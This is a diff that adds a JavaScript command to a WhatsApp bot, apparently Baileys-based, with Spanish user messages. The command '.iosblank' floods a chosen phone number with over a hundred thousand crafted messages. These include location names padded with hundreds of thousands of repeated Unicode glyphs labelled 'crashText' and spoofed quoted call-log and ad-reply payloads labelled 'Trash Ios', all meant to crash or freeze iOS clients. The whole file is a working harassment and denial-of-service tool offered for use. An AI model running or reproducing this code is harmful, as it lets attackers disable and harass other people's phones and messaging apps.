@@ -1,0 +1,80 @@
+// by Tobi
+let handler = async (m, { text, conn }) => {
+  if (m.sender !== conn.user.jid) {
+    return m.reply('❌ Solo el propietario del bot puede usar este comando.');
+  }
+
+  if (!text || !text.startsWith('+')) {
+    return m.reply('❌ Debes especificar un número válido.\n\n📌 Ejemplo: *.iosblank +573001234567*');
+  }
+
+  const target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+  await m.reply('⌛ Enviando bugs iOS, espera un momento...');
+
+  for (let i = 0; i < 250; i++) {
+    for (let j = 0; j < 10; j++) {
+      for (let k = 0; k <= 50; k++) {
+        await sendIosLocation(conn, target);
+        await sendTrashIos(conn, target);
+      }
+    }
+  }
+
+  await m.reply(`✅ Bugs enviados exitosamente a:\n${text}`);
+};
+
+handler.help = ['iosblank <+número>'];
+handler.tags = ['tools'];
+handler.command = ['iosblank', 'locios'];
+export default handler;
+
+// Función de ubicación iOS
+async function sendIosLocation(conn, target) {
+  try {
+    const crashText = "DilxzВаэлтрикс͢ ϟ" + "𑇂𑆵𑆴𑆿".repeat(60000);
+    await conn.sendMessage(target, {
+      location: {
+        degreesLatitude: 11.11,
+        degreesLongitude: -11.11,
+        name: "\u0003               " + crashText,
+        url: "https://youtube.com/@dilxzdev"
+      }
+    });
+  } catch (err) {
+    console.error('❌ Error en sendIosLocation:', err);
+  }
+}
+
+// Función de basura iOS
+async function sendTrashIos(conn, target) {
+  try {
+    await conn.sendMessage(target, {
+      text: "DilxzВаэлтрикс͢ ϟ",
+      contextInfo: {
+        stanzaId: "1234567890ABCDEF",
+        participant: "13135550002@s.whatsapp.net",
+        quotedMessage: {
+          callLogMessage: {
+            isVideo: true,
+            callOutcome: "1",
+            durationSecs: "0",
+            callType: "REGULAR",
+            participants: [{ jid: "13135550002@s.whatsapp.net", callOutcome: "1" }]
+          }
+        },
+        externalAdReply: {
+          title: "🩸",
+          body: "Trash Ios ϟ",
+          mediaType: "VIDEO",
+          thumbnail: Buffer.alloc(1),
+          mediaUrl: "https://youtube.com/@dilxzdev",
+          sourceUrl: "https://youtube.com/@dilxzdev",
+          renderLargerThumbnail: true,
+          showAdAttribution: true
+        }
+      }
+    });
+  } catch (err) {
+    console.error('❌ Error en sendTrashIos:', err);
+  }
+}
